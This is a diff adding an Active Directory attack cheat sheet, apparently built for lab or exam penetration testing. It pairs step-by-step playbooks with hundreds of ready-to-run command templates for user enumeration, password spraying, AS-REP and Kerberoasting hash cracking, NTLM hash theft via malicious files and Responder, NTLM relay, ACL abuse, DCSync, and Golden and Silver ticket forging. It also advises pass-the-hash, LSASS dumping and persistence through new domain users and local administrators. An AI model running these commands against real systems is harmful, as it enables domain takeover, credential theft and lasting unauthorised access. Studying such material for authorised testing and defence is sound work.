@@ -1,0 +1,438 @@
+^AD notes:Scan all TCP ports and identify Windows services → check Domain Info.
+^AD notes:Check UDP ports (especially 53, 88, 389) if enumeration stalls.
+^AD notes:Identify Domain Controller(s), domain name, forest, and trusts → run Domain Info.
+^AD notes:Check SMB signing and domain/workgroup information → run NXC SMB.
+^AD notes:Attempt DNS zone transfer and AD-integrated DNS dump → run ADIDNS Dump.
+^AD notes:Check ldap, rpc, smb with anonymous access and look for public shares → run SMB Null Session.
+^AD notes:Attempt RID brute force to enumerate domain users and groups → run RID Brute.
+^AD notes:Attempt LDAP anonymous bind to enumerate domain objects → run LDAP Anonymous.
+^AD notes:Extract usernames from RID brute or LDAP results → use RID Brute or LDAP Anonymous.
+^AD notes:If naming convention discovered, generate username permutations → run Username Anarchy.
+^AD notes:Validate generated usernames against Kerberos → run Kerbrute.
+^AD notes:Build a clean users.txt from Kerbrute-verified usernames → reuse for AS-REP Roasting and Password Spraying.
+^AD notes:Build a clean users.txt and hash.txt from verified usernames and hash dump → run Password Spraying
+^AD notes:Test if any users do not require Kerberos pre-authentication → run AS-REP Roasting.
+^AD notes:If AS-REP hashes obtained, crack immediately → use hashcat and update credential list.
+^AD notes:If you have usernames but no passwords, attempt careful password spraying → run Password Spraying.
+^AD notes:Check domain lockout policy before spraying → run RPC Enum getdompwinfo or NXC SMB --pass-pol.
+^AD notes:If SMB signing disabled, attempt NTLM relay attacks → run NTLM Relay.
+^AD notes:Capture NTLMv2 hashes from network authentication attempts → run NTLM Theft.
+^AD notes:If username and password obtained, enumerate domain users, groups, and computers → run LDAP Authenticated.
+^AD notes:Enumerate accessible shares for each discovered credential → run NXC SMB.
+^AD notes:Test credentials across all protocols → run NXC SMB, NXC WINRM, NXC RDP, MSSQL.
+^AD notes:Always test both password authentication and NTLM hash authentication → run NXC SMB with -p and -H.
+^AD notes:Test both domain authentication and local authentication scenarios → run NXC SMB with and without --local-auth.
+^AD notes:Enumerate domain structure and attack paths → run BloodHound Python.
+^AD notes:If you obtain a shell on a Windows machine, collect BloodHound data locally → run SharpHound.
+^AD notes:In BloodHound look for ACL abuse, delegation abuse, or DCSync rights → analyze BloodHound results.
+^AD notes:Request Kerberos service tickets for SPN accounts → run Kerberoasting.
+^AD notes:If Kerberoast hashes obtained, crack immediately → update credential list.
+^AD notes:Check delegation abuse paths such as constrained delegation, unconstrained delegation, or RBCD → review BloodHound output.
+^AD notes:Check for certificate abuse opportunities in AD CS → run certipy-ad find.
+^AD notes:If ACL abuse or DCSync rights discovered → run DCSync.
+^AD notes:If service account NTLM hash and SPN known → evaluate Silver Ticket.
+^AD notes:If krbtgt hash obtained → evaluate Golden Ticket.
+^AD notes:If you gain Domain Controller admin access → dump NTDS.dit immediately.
+^AD notes:After obtaining credentials or hashes, perform lateral movement across hosts → run Impacket Lateral Movement.
+^AD notes:Prefer stable interactive shells when WinRM is open → run Evil-WinRM.
+^AD notes:If SQL access obtained, attempt command execution → run MSSQL xp_cmdshell.
+^AD notes:If RDP is disabled but credentials valid, enable RDP for GUI access → run Enable RDP.
+^AD notes:If WinRM is disabled but privileges allow, enable WinRM → run Enable WinRM.
+^AD notes:If you gain a shell as a low privilege user, check local privilege escalation → run PowerUp.
+^AD notes:Check for common Windows privilege escalation vectors such as unquoted service paths, modifiable services, or scheduled tasks → review PowerUp output.
+^AD notes:Check AlwaysInstallElevated and AutoLogon registry credentials → review PowerUp output.
+^AD notes:Check LSA secrets, GPP passwords, and PowerShell history → review credential artifacts.
+^AD notes:Check whoami /priv for exploitable privileges → evaluate SeBackupPrivilege or SeManageVolumePrivilege.
+^AD notes:If SeBackupPrivilege present, dump registry hives → run SeBackupPrivilege.
+^AD notes:If SeManageVolumePrivilege present, attempt privilege escalation → run SeManageVolume.
+^AD notes:If local administrator access obtained, dump local credentials → run SAM Dump or LSA Secrets or Dump hashes remotely
+^AD notes:Dump LSASS memory to extract additional credentials → run LSASS Dump or NanoDump.
+^AD notes:Extract NTLM hashes and reuse them across the network → run Pass-the-Hash.
+^AD notes:Collect DPAPI secrets for stored credentials → run DPAPI.
+^AD notes:Use recovered credentials or hashes to pivot into other machines → run Impacket Lateral Movement.
+^AD notes:Re-test all collected credentials across all discovered machines → repeat NXC SMB and WINRM authentication.
+^AD notes:Never assume you are finished until every credential has been tested on every host.
+^AD notes:If GenericAll permissions on a user discovered, reset their password → abuse ACL.
+^AD notes:If AddMember rights on privileged group discovered, add your account → abuse group membership.
+^AD notes:If domain privileges allow, create a new domain user for persistence → run Create User.
+^AD notes:Create additional local administrators on compromised machines for persistence.
+^AD notes:If new network segments discovered on compromised host → check ipconfig /all.
+^AD notes:If internal pivot required → run tunneling tools such as ssh -D, chisel, or proxychains.
+^AD notes:After pivoting into a new network segment, restart enumeration → return to Domain Info.
+^AD Reminder:Start by confirming AD context (domain/DC/trusts) → run Domain Info.
+^AD Reminder:If SMB/RPC allow anonymous probing, enumerate users quickly → run SMB Null Session then RID Brute.
+^AD Reminder:Once you have usernames, expand candidate lists → run Username Anarchy then Kerbrute.
+^AD Reminder:Only treat Kerbrute-validated usernames as clean users.txt → reuse for AS-REP Roasting and Password Spraying.
+^AD Reminder:If you have usernames but no password, attempt AS-REP roasting first → crack and reuse credentials.
+^AD Reminder:If you have credentials, immediately enumerate domain objects → run LDAP Authenticated and BloodHound Python.
+^AD Reminder:Perform Kerberoasting early once credentials exist → crack hashes and reuse credentials.
+^AD Reminder:Check password policy before any password spraying → avoid account lockouts.
+^AD Reminder:If SMB signing is disabled, consider NTLM relay paths if the scenario supports it.
+^AD Reminder:Once any foothold is obtained, map attack paths immediately → run BloodHound.
+^AD Reminder:If already on a domain-joined host, collect additional BloodHound data locally → run SharpHound.
+^AD Reminder:When a high-value primitive appears (ACL abuse, delegation, GPP, LAPS, DCSync), pivot directly to the relevant attack path.
+^AD Reminder:If you gain local admin on a machine with a Domain Admin session, dump LSASS and impersonate tokens → run LSASS Dump or Mimikatz.
+^AD Reminder:If GenericAll on a user discovered → reset their password.
+^AD Reminder:If GenericAll or WriteMembers on a group discovered → add yourself to the group.
+^AD Reminder:If WriteDacl or WriteProperty on the domain object discovered → grant yourself DCSync rights.
+^AD Reminder:If replication rights discovered (DS-Replication-Get-Changes + All) → run DCSync immediately.
+^AD Reminder:If you compromise any Domain Admin, Enterprise Admin, or Administrators account → run DCSync immediately.
+^AD Reminder:If you reach a Domain Controller → dump NTDS.dit or run secretsdump.
+^AD Reminder:If accounts with SPNs discovered → perform Kerberoasting.
+^AD Reminder:If accounts with DONT_REQ_PREAUTH discovered → perform AS-REP roasting.
+^AD Reminder:If AD CS exists and vulnerable templates discovered → request privileged certificates (ESC attacks).
+^AD Reminder:If LAPS passwords readable → use them for lateral movement.
+^AD Reminder:If GPP cpassword discovered in SYSVOL → decrypt and reuse credentials.
+^AD Reminder:If delegation misconfiguration discovered (unconstrained, constrained, RBCD) → abuse delegation path.
+^AD Reminder:If service account hashes discovered → evaluate Silver Ticket.
+^AD Reminder:If krbtgt hash discovered → evaluate Golden Ticket.
+^AD Reminder:After Domain Admin privileges obtained, dump all domain credentials and pivot across the network.
+^AD Reminder:After every privilege escalation, re-run enumeration because new privileges expose new attack paths.
+^AD Reminder:GenericAll on User → reset password without knowing current one → run: ACL Force Password Reset
+^AD Reminder:GenericAll on Group → add yourself or any user to group → run: ACL Add to Group
+^AD Reminder:GenericAll on Computer → Kerberoast computer account (if SPN set) or configure RBCD → run: RBCD Attack
+^AD Reminder:GenericWrite on User → write SPN then Kerberoast, or modify logon script → run: Kerberoasting / SMB Share Attack
+^AD Reminder:GenericWrite on Group → add members to group if membership attribute writable → run: ACL Add to Group
+^AD Reminder:GenericWrite on Computer → set RBCD via msDS-AllowedToActOnBehalfOfOtherIdentity → run: RBCD Attack
+^AD Reminder:WriteDacl on Domain → grant yourself replication rights → run: ACL Abuse then DCSync
+^AD Reminder:WriteDacl on Group → modify group ACL to grant yourself membership control → run: ACL Add to Group
+^AD Reminder:WriteDacl on User → grant yourself password reset or control permissions → run: ACL Force Password Reset
+^AD Reminder:WriteOwner on Domain → change owner to yourself then grant DCSync rights → run: ACL Abuse then DCSync
+^AD Reminder:WriteOwner on Domain Admins group → change owner then add yourself to group → run: ACL Add to Group
+^AD Reminder:WriteOwner on Computer → change owner then configure RBCD → run: RBCD Attack
+^AD Reminder:WriteProperty on Domain → grant yourself replication privileges → run: ACL Abuse then DCSync
+^AD Reminder:WriteProperty on Group → modify group membership attributes → run: ACL Add to Group
+^AD Reminder:Self-Membership (AddMember) on Group → add yourself directly to group → run: ACL Add to Group
+^AD Reminder:ForceChangePassword (User-Force-Change-Password) → reset user password without knowing current password → run: ACL Force Password Reset
+^AD Reminder:DS-Replication-Get-Changes AND DS-Replication-Get-Changes-All on Domain → perform replication attack → run: DCSync
+^AD Reminder:WriteSPN (Validated-SPN) on User → write fake SPN then request service ticket → run: Kerberoasting
+^AD Reminder:AddKey (msDS-KeyCredentialLink) on User or Computer → inject shadow credentials for PKINIT authentication → run: Shadow Credentials / PKINIT
+^AD Reminder:AddAllowedToAct (msDS-AllowedToActOnBehalfOfOtherIdentity) on Computer → configure Resource-Based Constrained Delegation → run: RBCD Attack
+^AD Reminder:ReadLAPSPassword (ms-Mcs-AdmPwd) on Computer → read stored local administrator password → run: LAPS Reader
+^AD Reminder:ReadGPPPassword on SYSVOL → retrieve and decrypt cpassword value → run: GPP/cPassword Decrypt
+^AD Reminder:ExtendedRight (User-Force-Change-Password) → equivalent to ForceChangePassword → run: ACL Force Password Reset
+^AD Reminder:ExtendedRight (DS-Replication-Get-Changes) combined with DS-Replication-Get-Changes-All → replication rights granted → run: DCSync
+^AD Reminder:WriteMember on Group → add or remove members from group → run: ACL Add to Group
+^AD Reminder:AllExtendedRights on Domain → includes replication rights → run: DCSync
+^AD Reminder:AllExtendedRights on User → includes ForceChangePassword → run: ACL Force Password Reset
+^AD Reminder:AllExtendedRights on Group → includes AddMember privileges → run: ACL Add to Group
+^AD Reminder:Self (Validate Write to Members) on Group → write your own DN into group membership attribute → run: ACL Add to Group
+^AD Reminder:GenericAll on User → reset target user's password without knowing current one → run: net rpc password <target_user> '<new_password>' -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:GenericAll on Group → add your user to the group → run: net rpc group addmem "<group>" <user> -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:GenericAll on Computer → configure Resource-Based Constrained Delegation → run: impacket-rbcd -delegate-from <controlled_computer>$ -delegate-to <target_computer>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>
+^AD Reminder:GenericWrite on User → add fake SPN then Kerberoast account → run: Set-DomainObject -Identity <target_user> -SET @{serviceprincipalname='fake/spn'} then run Kerberoasting
+^AD Reminder:GenericWrite on Computer → configure RBCD using msDS-AllowedToActOnBehalfOfOtherIdentity → run: impacket-rbcd -delegate-from <controlled_machine>$ -delegate-to <target_machine>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>
+^AD Reminder:GenericWrite on Group → modify group membership attribute → run: net rpc group addmem "<group>" <user> -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:WriteDacl on Domain → grant yourself replication privileges → run: Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -PrincipalIdentity "<user>" -Rights DCSync -Credential $cred
+^AD Reminder:WriteDacl on Group → modify group ACL then add yourself → run: net rpc group addmem "<group>" <user> -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:WriteDacl on User → grant yourself ForceChangePassword rights → run: Add-DomainObjectAcl -TargetIdentity <target_user> -PrincipalIdentity <user> -Rights ResetPassword
+^AD Reminder:WriteOwner on Domain → change owner then grant DCSync rights → run: Set-DomainObjectOwner -Identity "DC=<domain>,DC=<tld>" -OwnerIdentity <user> then run Add-DomainObjectAcl
+^AD Reminder:WriteOwner on Group → change owner then add yourself to group → run: Set-DomainObjectOwner -Identity "<group>" -OwnerIdentity <user>
+^AD Reminder:WriteOwner on Computer → change owner then configure RBCD → run: Set-DomainObjectOwner -Identity <computer> -OwnerIdentity <user>
+^AD Reminder:ForceChangePassword → reset target user password → run: net rpc password <target_user> '<new_password>' -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:WriteSPN → add SPN then Kerberoast → run: Set-DomainObject -Identity <target_user> -SET @{serviceprincipalname='fake/spn'} then run Kerberoasting
+^AD Reminder:AddMember → add yourself to group directly → run: net rpc group addmem "<group>" <user> -U '<domain>/<user>%<password>' -S <dc-ip>
+^AD Reminder:DS-Replication-Get-Changes + DS-Replication-Get-Changes-All → replication rights available → run: impacket-secretsdump -just-dc-ntlm '<domain>/<user>:<password>'@<dc-ip>
+^AD Reminder:ReadLAPSPassword → retrieve local admin password from AD attribute → run: nxc ldap <dc-ip> -u <user> -p '<password>' -M laps
+^AD Reminder:ReadGPPPassword → retrieve SYSVOL policy file and decrypt cpassword → run: gpp-decrypt <cpassword>
+^AD Reminder:AddAllowedToAct (RBCD) → configure Resource-Based Constrained Delegation → run: impacket-rbcd -delegate-from <controlled_machine>$ -delegate-to <target_machine>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>
+^AD Reminder:AddKey (Shadow Credentials) → inject key credential and authenticate via PKINIT → run: certipy-ad shadow auto -u <user> -p '<password>' -account <target_account> -dc-ip <dc-ip>
+^AD attack notes:See https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol for available nxc protocols
+
+Domain Info:nxc smb <target> # Probe SMB to fingerprint domain/workgroup and host OS; kali-machine
+Domain Info:nltest /dclist:<domain> # List domain controllers from Windows; target-machine
+Domain Info:nltest /domain_trusts # List domain trusts; target-machine
+Domain Info:nltest /dsgetdc:<domain> # Get domain controller info; target-machine
+Domain Info:nltest /forest_trusts # List forest trusts; target-machine
+Domain Info:echo %USERDOMAIN% # Show current domain from environment; target-machine
+SMB Null Session:smbclient -L //<target> -N # List shares with null session; kali-machine
+SMB Null Session:rpcclient -U "" -N <target> # Connect to RPC with null session; kali-machine
+SMB Null Session:enum4linux -a -u "" -p "" <target> # Enumerate with null session; kali-machine
+SMB Null Session:nxc smb <target> -u '' -p '' --rid-brute # RID brute with null session; kali-machine
+RID Brute:nxc smb <target> -u '' -p '' --rid-brute | grep SidTypeUser # Extract usernames from RID brute; kali-machine
+RID Brute:nxc smb <target> -u 'guest' -p '' --rid-brute # RID brute with guest account; kali-machine
+RID Brute:impacket-lookupsid 'guest'@<dc-ip> -no-pass # Lookup SIDs with guest; kali-machine
+RID Brute:impacket-lookupsid '':''@<dc-ip> -no-pass # Null session SID lookup; kali-machine
+RID Brute:nxc smb <target> -u '<user>' -p '<password>' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f2 | tee users.txt # Extract usernames with creds; kali-machine
+LDAP Anonymous:ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" # Anonymous LDAP bind; kali-machine
+LDAP Anonymous:ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' # Extract usernames; kali-machine
+LDAP Anonymous:ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" userPrincipalName | grep userPrincipalName | sed 's/userPrincipalName: //' # Extract UPNs; kali-machine
+LDAP Anonymous:nxc ldap <target> -u '' -p '' # Test anonymous LDAP bind; kali-machine
+LDAP Authenticated:ldapsearch -x -H ldap://<target> -D '<user>@<domain>' -w '<password>' -b "DC=<domain>,DC=<tld>" # Authenticated LDAP search; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --users # List users with nxc; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --groups # List groups with nxc; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --trusted-for-delegation # Find accounts trusted for delegation; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --password-not-required # Find accounts with password not required; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --admin-count # Find admin accounts; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --asreproast asrep.out # AS-REP roast with creds; kali-machine
+LDAP Authenticated:nxc ldap <target> -u '<user>' -p '<password>' --kerberoasting output.txt # Kerberoast with creds; kali-machine
+Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> # Enumerate users via Kerberos; kali-machine
+Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 userenum -d <domain> --dc <dc-ip> <wordlist1> | grep -i '@<domain>' | awk '{print $2}' | cut -d '@' -f1 > users.txt # Extract clean usernames; kali-machine
+Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 bruteuser -d <domain> --dc <dc-ip> <wordlist1> <user> # Brute force single user; kali-machine
+Kerbrute:/home/kali/Tools/kerbrute_linux_amd64 passwordspray -d <domain> --dc <dc-ip> users.txt <password> # Password spray; kali-machine
+Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations; kali-machine
+Username Anarchy:/home/kali/Tools/username-anarchy/username-anarchy --recognise <user> # Analyze username scheme; kali-machine
+BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All # Collect all BloodHound data; kali-machine
+BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c Group,LocalAdmin,RDP,DCOM,Session # Collect specific data; kali-machine
+BloodHound Python:bloodhound-python -d <domain> -u <user> -p <password> -dc <dc-ip> -c All --zip # Collect and zip; kali-machine
+BloodHound Python:bloodhound-python -d <domain> -u <user> --hashes <ntlm> -dc <dc-ip> -c All # Collect with NTLM hash; kali-machine
+BloodHound NXC:nxc ldap <target> -u '<user>' -p '<password>' --bloodhound --collection All --dns-server <dc-ip> # Collect via nxc; kali-machine
+SharpHound:.\SharpHound.exe -c All # Run SharpHound on target; target-machine
+SharpHound:.\SharpHound.exe --CollectionMethods All --Domain <domain> --DNSHost <dc-ip> # Run with specific DC; target-machine
+SharpHound:.\SharpHound.exe -c Group,LocalAdmin,RDP,DCOM,Session --ZipFileName <filename> # Collect specific data; target-machine
+SharpHound:.\SharpHound.exe -c Session --Loop --loopduration 00:00:10 # Stealth session collection; target-machine
+ADIDNS Dump:adidnsdump -u '<domain>\<user>' -p '<password>' -r ldap://<dc-ip>:389 # Dump AD-integrated DNS; kali-machine
+ADIDNS Dump:adidnsdump -u '<domain>\<user>' -p '<password>' --zone <domain> <dc-ip> # Dump specific zone; kali-machine
+ADIDNS Dump:adidnsdump -u '<domain>\<user>' -p '<password>' --forest <dc-ip> # Dump ForestDnsZones; kali-machine
+ADIDNS Dump:adidnsdump -u '<domain>\<user>' -p '<password>' --ssl ldap://<dc-ip>:636 # Dump over LDAPS; kali-machine
+RPC Enum:rpcclient -U "<domain>/<user>%<password>" <dc-ip> # Connect with credentials; kali-machine
+RPC Enum:enumdomusers # Enumerate domain users; kali-machine
+RPC Enum:enumdomgroups # Enumerate domain groups; kali-machine
+RPC Enum:querydispinfo # Display user info; kali-machine
+RPC Enum:getdompwinfo # Get domain password policy; kali-machine
+RPC Enum:enumalsgroups builtin # Enumerate built-in groups; kali-machine
+RPC Enum:lsaenumsid # Enumerate SIDs; kali-machine
+Impacket Enum:impacket-GetADUsers -dc-ip <dc-ip> '<domain>/<user>:<password>' -all # List all AD users; kali-machine
+Impacket Enum:impacket-GetADUsers -dc-ip <dc-ip> -k -no-pass <domain>/ # List with Kerberos; kali-machine
+Impacket Enum:impacket-netview -dc-ip <dc-ip> <domain>/<user>:<password> # Enumerate sessions and shares; kali-machine
+Impacket Enum:impacket-smbclient -k -no-pass -dc-ip <dc-ip> <domain>/@<target> # SMB client with Kerberos; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --users # List domain users; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --groups # List domain groups; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --shares # List shares; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --loggedon-users # Find logged on users; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --sessions # List active sessions; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --disks # List disks; kali-machine
+NXC SMB:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --pass-pol # Get password policy; kali-machine
+NXC SMB:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth # Local auth with NTLM; kali-machine
+
+AS-REP Roasting # 1:impacket-GetNPUsers '<domain>/' -dc-ip <dc-ip> -usersfile <wordlist1> -no-pass -outputfile hash.txt # Test username list for users without pre-auth. If hashes returned, crack with hashcat -m 18200; kali-machine
+AS-REP Roasting # 1:impacket-GetNPUsers '<domain>/<user>' -dc-ip <dc-ip> -no-pass -outputfile hash.txt # Test single user when you have one username; kali-machine
+AS-REP Roasting # 1:nxc ldap <target> -u <userlist> -p '' --asreproast output.txt # AS-REP roast with nxc using username list; kali-machine
+AS-REP Roasting # 1:nxc ldap <target> -u <user> -p <password> --asreproast output.txt # Using valid creds, enumerate and test all domain users; kali-machine
+AS-REP Roasting # 1:sudo hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force # Crack AS-REP hashes. Success gives valid credentials; kali-machine
+AS-REP Roasting # 1:sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt # Alternative cracking with john; kali-machine
+AS-REP Roasting # 2:.\Rubeus.exe asreproast /nowrap # Run Rubeus AS-REP roast on target; target-machine
+AS-REP Roasting # 2:.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt # Save in hashcat format; target-machine
+AS-REP Roasting # 2:sudo hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force # Crack Rubeus-gathered hashes; kali-machine
+Kerberoasting # 1:impacket-GetUserSPNs -dc-ip <dc-ip> '<domain>/<user>:<password>' -request # Request TGS for all SPNs with credentials; kali-machine
+Kerberoasting # 1:impacket-GetUserSPNs -dc-ip <dc-ip> '<domain>/' -usersfile <wordlist1> -no-pass -request # Try without creds (rarely works); kali-machine
+Kerberoasting # 1:sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force # Crack TGS hashes. Success gives service account passwords; kali-machine
+Kerberoasting # 1:echo <TGS-REP hash> > <filename1> # Save TGS hash for cracking; target-machine
+Kerberoasting # 2:nxc ldap <target> -u <user> -p <password> --kerberoasting output.txt # Kerberoast with nxc; kali-machine
+Kerberoasting # 3:.\Rubeus.exe kerberoast /nowrap # Run Rubeus kerberoast; target-machine
+Kerberoasting # 3:.\Rubeus.exe kerberoast /outfile:hashes.txt # Save hashes to file; target-machine
+Kerberoasting # 3:.\Rubeus.exe kerberoast /rc4opsec # Use RC4 for older systems; target-machine
+Kerberoasting # 3:.\Rubeus.exe kerberoast /aes # Request AES tickets if supported; target-machine
+Kerberoasting # 3:.\Rubeus.exe kerberoast /tgtdeleg # Use TGT delegation trick; target-machine
+Kerberoasting # 3:echo <$krb5tgs> | tr -d '\n ' > hash.txt # Extract TGS hash for cracking; kali-machine
+Kerberoasting # 3:sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force # Crack Rubeus-gathered hashes; kali-machine
+Kerberoasting # 4:python3 targetedKerberoast.py --dc-ip <dc-ip> -d <domain> -u <user> -p '<password>' # perform targeted Kerberoasting by adding SPN and requesting TGS hash for specific user (https://github.com/ShutdownRepo/targetedKerberoast); kali-machine
+Kerberoasting # 5:Kerberoasting:setspn -T <domain> -Q */* # Find all SPN accounts in domain; target-machine
+Kerberoasting # 5:Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN" # Request TGS for SPN; target-machine
+Password Spraying # 1:nxc smb <target> -u <wordlist1> -p '<password>' --continue-on-success # SMB password spray. Check lockout policy first; kali-machine
+Password Spraying # 1:nxc ldap <target> -u <wordlist1> -p '<password>' --continue-on-success # LDAP password spray; kali-machine
+Password Spraying # 1:nxc winrm <target> -u <wordlist1> -p '<password>' --continue-on-success # WinRM password spray; kali-machine
+Password Spraying # 1:nxc smb <target> -u <user> -p '<wordlist1>' --continue-on-success # SMB password spray. Check lockout policy first; kali-machine
+Password Spraying # 1:nxc smb <target> -u <wordlist1> -H <wordlist2> --continue-on-success # Pass-the-hash spray; kali-machine
+Password Spraying # 1:nxc wmi <target> -u <wordlist1> -H <wordlist2> --continue-on-success # WMI pass-the-hash spray; kali-machine
+Password Spraying # 1:nxc smb <target> -u <user> -H '<wordlist1>' --continue-on-success # SMB password spray. Check lockout policy first; kali-machine
+Password Spraying # 2:kerbrute passwordspray -d <domain> users.txt '<password>' # Kerberos password spray (less likely to lockout); kali-machine
+Password Spraying # 3:.\Rubeus.exe brute /password:<password> /noticket # Rubeus password spray; target-machine
+Password Spraying # 3:.\Rubeus.exe brute /passwords:<wordlist1> /noticket /outfile:<filename> # Rubeus spray with wordlist; target-machine
+NTLM Theft:cd ~/Tools/ntlm_theft && python3 ntlm_theft.py --generate all --server <kali> --filename Confidential # Generate malicious files to steal NTLM hashes; kali-machine
+NTLM Theft:sudo responder -I tun0 -A # Start responder to capture when files are opened; kali-machine
+NTLM Theft:smbclient //<target>/share -U '<domain>/<user>%<password>' -c 'prompt off; mput *' # Upload malicious files to target share; kali-machine
+NTLM Relay:sudo impacket-ntlmrelayx -tf targets.txt -smb2support -socks # Relay to targets with SOCKS support; kali-machine
+NTLM Relay:sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c whoami # Relay with command execution; kali-machine
+NTLM Relay:sudo impacket-ntlmrelayx -tf targets.txt -smb2support -of hashes.txt # Relay and dump hashes; kali-machine
+GPO Abuse:.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy" ; gpupdate /force # Add user to local admin via GPO; target-machine
+DCSync # 1:net user <user> <password> /add /domain # Create domain user. Use edwin/P@ssw0rd@123 as test; target-machine
+DCSync # 1:net group "<group with writedacl>" <user> /add # Add user to group; target-machine
+DCSync # 1:net localgroup "Remote Management Users" <user> /add # Add to WinRM group; target-machine
+DCSync # 1:net localgroup "Remote Desktop Users" <user> /add # Add to RDP group; target-machine
+DCSync # 1:$password = ConvertTo-SecureString "<password>" -AsPlainText -Force # Create secure string; target-machine
+DCSync # 1:$cred = New-Object System.Management.Automation.PSCredential("<domain>\<user>", $password) # Create credential object; target-machine
+DCSync # 1:Add-objectACL -PrincipalIdentity <user> -Credential $cred -Rights DCSync # Grant DCSync rights; target-machine
+DCSync # 1:Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<tld>" -PrincipalIdentity "<user>" -Rights DCSync -Credential $cred -Verbose # grant replication rights; target-machine
+DCSync # 1:impacket-secretsdump -just-dc-ntlm '<domain>/<user>:<password>'@<dc-ip> # DCSync attack; kali-machine
+DCSync # 2:impacket-secretsdump -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip> # DCSync with Kerberos ticket; kali-machine
+DCSync # 2:impacket-secretsdump -just-dc-ntlm '<domain>/<user>':'<password>'@<target> # Domain Controller NTDS dump; kali-machine
+DCSync # 3:.\mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" # DCSync with mimikatz on target; target-machine
+Golden Ticket # 1:impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <domain_sid> -domain <domain> Administrator # Forge Golden Ticket; kali-machine
+Golden Ticket # 1:export KRB5CCNAME=/path/to/Administrator.ccache # Set ticket cache; kali-machine
+Golden Ticket # 1:impacket-psexec -k -no-pass <domain>/Administrator@<target> # Use Golden Ticket to access target; kali-machine
+Golden Ticket # 2:.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt" # Golden Ticket with mimikatz; target-machine
+Silver Ticket # 1:impacket-ticketer -nthash <service_ntlm> -domain-sid <domain_sid> -domain <domain> -spn <service_spn> Administrator # Forge Silver Ticket for specific service; kali-machine
+Silver Ticket # 1:export KRB5CCNAME=/path/to/Administrator.ccache # Set ticket cache; kali-machine
+Silver Ticket # 1:impacket-smbclient -k -no-pass -dc-ip <dc-ip> //<target>/C$ # Access C$ with Silver Ticket; kali-machine
+Silver Ticket # 1:impacket-smbexec -k -no-pass <domain>/Administrator@<target> # Execute commands via SMB with ticket; kali-machine
+Silver Ticket # 1:impacket-wmiexec -k -no-pass <domain>/Administrator@<target> # WMI with ticket; kali-machine
+Silver Ticket # 1:impacket-mssqlclient -k -no-pass <domain>/Administrator@<target> # MSSQL with ticket; kali-machine
+Silver Ticket # 1:impacket-ldapsearch -k -no-pass -dc-ip <dc-ip> <domain>/Administrator@<target> # LDAP with ticket; kali-machine
+Silver Ticket # 2:.\mimikatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<ntlm> /ptt" # Silver Ticket with mimikatz; target-machine
+Pass-the-Hash:nxc smb <target> -u users.txt -H hashes.txt --continue-on-success # Spray hashes against users; kali-machine
+Pass-the-Hash:impacket-psexec -hashes :<ntlm> <domain>/<user>@<target> # PSExec with hash; kali-machine
+Pass-the-Hash:impacket-wmiexec -hashes :<ntlm> <domain>/<user>@<target> # WMI exec with hash; kali-machine
